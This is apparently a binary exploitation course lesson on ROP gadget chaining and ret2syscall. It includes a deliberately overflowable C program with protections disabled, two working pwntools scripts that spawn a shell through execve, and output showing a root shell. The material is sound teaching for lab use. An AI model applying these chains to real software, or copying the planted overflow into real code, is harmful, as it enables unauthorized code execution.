---
title: "Lesson 6.3: Chaining ROP Gadgets and ret2syscall"
image:
  path: /assets/img/covers/pwn-6-3-rop-ret2syscall.webp
  alt: "Chaining ROP Gadgets and ret2syscall"
date: 2022-11-30 19:07:00 +0700
categories: ["Binary Exploitation", "Pwn · ret2libc and ROP"]
tags: [pwn, rop, syscall, gadget]
render_with_liquid: false
---

ret2libc is one link. ROP is the whole chain. This lesson formally names the technique Return Oriented Programming, shows how to string together several gadgets to control arbitrary registers, and builds ret2syscall, which calls `execve("/bin/sh")` directly through a syscall instead of borrowing `system`.

![A ROP chain popping registers in order, then invoking syscall for execve](/assets/img/pwn/pwn-6-3-rop-ret2syscall.svg)
_Each gadget ends in ret, which pulls the next address off the stack; rsp becomes the instruction pointer._

**Time:** about 75 minutes of reading and lab work. **Difficulty:** hard.

**Prerequisites:** Lesson 6.1 (ret2libc), Lesson 3.3 (the pop rdi gadget), Lesson 1.1 (assembly, registers), Lesson 1.2 (saved RIP, calling convention).

**Tools:** pwntools, ROPgadget, ropper, gdb with pwndbg, checksec.

## Goals

After this lesson you will understand what ROP is and why a chain of gadgets is equivalent to a small program, be able to read and pick gadgets from ROPgadget or ropper output, set rax, rdi, rsi, rdx as you like and then call syscall, and build a ret2syscall that calls `execve("/bin/sh", 0, 0)`.

## Theory

### What ROP is

ROP (Return Oriented Programming) is a technique that chains short existing instruction sequences, each ending in `ret`, called gadgets, into an execution flow you control. Because NX only blocks running new code, not re-running old code, you never write any instructions, you only lay out gadget addresses next to each other on the stack and let `ret` walk the instruction pointer through them one by one.

The mechanism rests on one property: `ret` pops the value at the top of the stack as the address to jump to, then advances rsp. So if you line up a sequence of gadget addresses on the stack, each gadget does something small then `ret`s, and that `ret` automatically jumps to the next gadget. The stack becomes an "instruction list", with rsp acting as the instruction pointer. A ret2libc (Lesson 6.1) is really just a two-link ROP chain. When you need more, the idea stays the same, it just gets longer.

Picture a chain that sets two registers then calls a function:

```
rsp -> [ pop rdi ; ret ]   gadget 1
       [ value_rdi     ]   popped into rdi
       [ pop rsi ; ret ]   gadget 2
       [ value_rsi     ]   popped into rsi
       [ function_addr  ]   call it with rdi, rsi set
```

### Gadgets: finding and reading them

A gadget is any byte sequence ending in the `ret` opcode (0xc3) that decodes into something useful. Nobody plants them on purpose, they just fall out of code everywhere. Find them with:

```bash
ROPgadget --binary ./vuln                 # list everything
ROPgadget --binary ./vuln | grep 'pop rdi ; ret'
ropper --file ./vuln --search 'pop rdi'   # ropper, different syntax, same goal
```

Output looks like `0x0000000000401234 : pop rdi ; ret`. The first column is the address you put in the chain. A few gadgets you use a lot:

- `pop rdi ; ret`, `pop rsi ; ret`, `pop rdx ; ret`, `pop rax ; ret`: load a constant into a register.
- `pop rsi ; pop r15 ; ret`: sets rsi along with an extra pop, so you must insert a throwaway value for r15.
- `syscall ; ret` or just `syscall`: the syscall entry point.
- `ret`: an empty gadget, used to align the stack (Lesson 6.1).
- `mov qword ptr [rdi], rsi ; ret`: writes to arbitrary memory (used when you have to place a string yourself, see write4 in Lesson 6.4).

Important tip: a gadget with an extra pop needs the exact number of filler slots, or the chain shifts out of place. pwntools's `ROP` class handles this for you, but by hand you have to count carefully.

### ret2syscall

`system` is convenient but depends on libc. When there is no libc (a static binary), or when you want full control, you call the kernel syscall directly. On x86-64, a syscall takes its number in rax and its arguments in rdi, rsi, rdx, r10, r8, r9 (note the fourth argument is r10, not rcx as in a normal function call), then runs the `syscall` instruction.

To get a shell, we call `execve("/bin/sh", NULL, NULL)`. The number for `execve` on x86-64 is 59 (0x3b), so we need the following.

```
rax = 59            (execve's syscall number)
rdi = address of "/bin/sh"
rsi = 0             (argv = NULL)
rdx = 0             (envp = NULL)
syscall
```

Here is the matching ROP chain, assuming you already have the gadgets and a `"/bin/sh"` string at address `binsh`.

```
pop rax ; ret   ; 59
pop rdi ; ret   ; binsh
pop rsi ; ret   ; 0
pop rdx ; ret   ; 0
syscall
```

If the binary does not already have a `"/bin/sh"` string, you have to write it into a writable region (.bss) yourself using a memory-write gadget, then point rdi at it. That writing technique is exactly the write4 challenge in Lesson 6.4.

### When ret2syscall, when ret2libc

- Static binary, or libc cannot be leaked: ret2syscall is the obvious choice, because the gadgets you need (pop rax, syscall) are usually abundant in a large static binary.
- Dynamic binary, libc leaked: ret2libc is leaner (fewer gadgets), or use one_gadget directly.
- Realistic mix: leak libc, then take gadgets from libc to build a ret2syscall, since libc has plenty of every gadget.

## Demo

Environment: Ubuntu 24.04, glibc 2.39, gcc 13.3 (verified running for real, see the Lab section below).

To have enough gadgets inside the binary itself, we build it static. But there is a surprise on the newer toolchain: a gcc 13 static binary DOES have a clean `pop rax ; ret` and `syscall`, but it does NOT have a clean `pop rdi/rsi/rdx ; ret` (they only appear buried inside unrelated instruction sequences). The fix is the same as Lesson 6.1/6.2, embedding a ROP Emporium style set of gadgets directly into the source so the chain runs exactly as the theory describes. Here is the source, `syscall.c`.

```c
#include <stdio.h>
#include <unistd.h>
char shell[] = "/bin/sh";                 // embed the string in .data so elf.search finds it

// clean usefulGadgets: pop rax/rdi/rsi/rdx ; ret and syscall ; ret
__asm__(
  ".text\n"
  ".globl pwn_pop_rax\npwn_pop_rax: pop %rax\n ret\n"
  ".globl pwn_pop_rdi\npwn_pop_rdi: pop %rdi\n ret\n"
  ".globl pwn_pop_rsi\npwn_pop_rsi: pop %rsi\n ret\n"
  ".globl pwn_pop_rdx\npwn_pop_rdx: pop %rdx\n ret\n"
  ".globl pwn_syscall\npwn_syscall: syscall\n ret\n"
);

void vuln(){ char buf[64]; read(0, buf, 512); }
int main(){ setvbuf(stdout, 0, 2, 0); puts(shell); vuln(); return 0; }
```

Note the line `char shell[] = "/bin/sh";`, where we deliberately stuff the string into the binary. A static binary compiled from code that does NOT call `system`/`execve` usually does not already contain `"/bin/sh"` (the linker only pulls in what is referenced), so we declare it ourselves to be safe, avoiding the need for write4.

Build it static, with NX on, no-PIE, and the stack protector off.

```bash
# -fcf-protection=none turns off gcc 13's endbr64 so the gadget stays clean
gcc -static -fno-stack-protector -no-pie -fcf-protection=none -o syscall syscall.c
checksec --file=syscall     # NX enabled, No PIE; a static binary is rich in gadgets
```

One confusing point: `checksec` on a static binary always reports `Canary found`, even with `-fno-stack-protector`. That is a canary inside glibc's own embedded functions, not in our `vuln()`. Our `vuln()` still has no canary, so the overflow works as expected.

Survey the gadgets and the string.

```bash
ROPgadget --binary ./syscall | grep -E ': (pop rax|pop rdi|pop rsi|pop rdx|syscall) ; ret$'
ROPgadget --binary ./syscall --string '/bin/sh'     # check whether it is already there
```

Because we declared `char shell[]` above, `elf.search(b'/bin/sh\x00')` will find it for sure (in this build it was at 0x4aa0d0). If you hit a binary without the string and you cannot edit the source, you write `"/bin/sh"` into a writable region with write4 (Lesson 6.4) and point `rdi` there. Here is a script for ret2syscall, letting pwntools arrange the gadgets, followed by a manual version to understand the mechanism.

```python
from pwn import *

elf = context.binary = ELF('./syscall')
io  = process('./syscall')

offset = 72                       # VERIFY this yourself with cyclic
rop = ROP(elf)

binsh = next(elf.search(b'/bin/sh\x00'))   # the string lives in the static binary
# option 1: let pwntools build the execve call
rop.execve(binsh, 0, 0)           # note below: pwntools may choose SROP instead
log.info(rop.dump())              # print the chain for inspection

payload = flat(b'A' * offset, rop.chain())
io.send(payload)
io.interactive()
```

One thing worth saying clearly on glibc 2.39 plus gcc 13: pwntools's `rop.execve` does NOT always lay out the straightforward `pop rax ; pop rdi ; ...` chain you would picture. In practice it chooses SROP (Sigreturn Oriented Programming): it sets `rax = 0xf` (SYS_rt_sigreturn) and calls `syscall` so the kernel loads a whole SigreturnFrame from the stack, a frame that already has `rax=0x3b (execve)`, `rdi=&"/bin/sh"`, `rsi=rdx=0` baked in, then calls `syscall` a second time. This still gets a shell (verified), but it differs from the theoretical description. To see the chain actually set each register one at a time (and match the ret2syscall theory above), use the manual version below.

Here is the manual version, to see each register clearly and match the theory rather than let pwntools pick SROP.

```python
from pwn import *

elf = context.binary = ELF('./syscall')
io  = process('./syscall')
offset = 72

r = ROP(elf)
pop_rax = r.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = r.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = r.find_gadget(['pop rdx', 'ret'])[0]
syscall = r.find_gadget(['syscall'])[0]          # or 'syscall', 'ret'
binsh   = next(elf.search(b'/bin/sh\x00'))

payload = flat(
    b'A' * offset,
    pop_rax, 59,          # execve
    pop_rdi, binsh,       # argv[0] = "/bin/sh"
    pop_rsi, 0,           # argv = NULL
    pop_rdx, 0,           # envp = NULL
    syscall,
)
io.send(payload)
io.interactive()
```

When doing this by hand, if the gadget you found has an extra pop (for example only `pop rdx ; pop rbx ; ret` is available), you must insert a throwaway value for rbx right after the rdx value. This is the single most common cause of a chain shifting out and crashing in a confusing way, so check it with `rop.dump()` or single-step it in gdb, watching rsp move through each gadget correctly.

When debugging a chain in pwndbg, set a breakpoint right after the payload is read, then step through instructions with `stepi`, watching rsp and the registers change. Seeing `rax=0x3b, rdi` pointing at `/bin/sh`, `rsi=rdx=0` right before `syscall` confirms the chain is correct.

Here is the real output from the manual version (`exploit_manual.py` in the Lab section below) on Ubuntu 24.04 (glibc 2.39); since the gadgets are embedded, the addresses stay fixed and ASLR does not affect them.

```
[*] pop rax  = 0x401885
[*] pop rdi  = 0x401887
[*] pop rsi  = 0x401889
[*] pop rdx  = 0x40188b
[*] syscall  = 0x4012a4
[*] /bin/sh  = 0x4aa0d0
===PWNED_6_3M===
uid=0(root) gid=0(root) groups=0(root)
===END===
[+] ret2syscall (manual) OK
```

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 6.3</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/6.3.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/6.3/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/6.3/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/6.3/exploit_manual.py" download><i class="fa-solid fa-file-code"></i>exploit_manual.py</a>
<a class="lab-file" href="/assets/labs-pwn/6.3/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>

- Challenge: the binary, built static (`gcc -static -fno-stack-protector -no-pie -fcf-protection=none`), with NX on, has an overflow.
- Goal: get a shell with a ret2syscall calling `execve("/bin/sh", 0, 0)`.
- Hints, in steps:
  - Hint 1: list the pop rax/rdi/rsi/rdx gadgets and a `syscall`.
  - Hint 2: execve is number 59, remember rsi and rdx must be 0.
  - Hint 3: static binary with no `/bin/sh`? Write the string into .bss first (the write4 technique, Lesson 6.4), then point rdi there.
- Self check: can you list the exact register order that the `execve` syscall reads, and explain why a gadget with an extra pop needs a filler slot?
- Verified solution: `src.c` plus `build.sh` plus `exploit.py` (auto version) plus `exploit_manual.py` (manual version) plus `transcript.txt` and `transcript_manual.txt`, all running for real on Ubuntu 24.04, glibc 2.39, and getting a root shell.

## Key takeaways

- ROP lays gadget addresses on the stack; `ret` walks through them, rsp acts as the instruction pointer.
- A gadget ends in `ret`; find them with ROPgadget or ropper.
- A gadget with an extra pop needs exactly that many filler slots.
- ret2syscall: rax=59, rdi=/bin/sh, rsi=0, rdx=0, syscall (execve).
- The syscall convention uses r10 for the fourth argument, not rcx.

## Common pitfalls

- Forgetting the filler for an extra pop. A gadget like `pop rsi ; pop r15 ; ret` needs a value for r15, skip it and the whole chain shifts. Use `rop.dump()` to inspect it.
- Mixing up the syscall number or convention. execve is 59 on x86-64 (it is 11 on 32-bit x86, completely different). The fourth argument is r10.
- No `"/bin/sh"` in the binary. Small dynamic binaries usually do not have it, so you either write it yourself (write4) or take the string from libc.
- Using `syscall` with no `ret` after it. That is fine if it is the last link, but if you want to chain further you need `syscall ; ret`.
- Alignment. Less common with a raw syscall than with system, but if a libc call gets mixed into the chain you still need 16-byte alignment.

## Further reading

- ROP Emporium (Lesson 6.4) to drill each ROP skill separately.
- The x86-64 syscall table (for example the chromium syscalls page, or `ausyscall --dump`).
- ropper and its automatic gadget-chain search, compared to ROPgadget.
- pwntools documentation for the `ROP` class, `rop.execve`, `rop.call`, `rop.dump`.
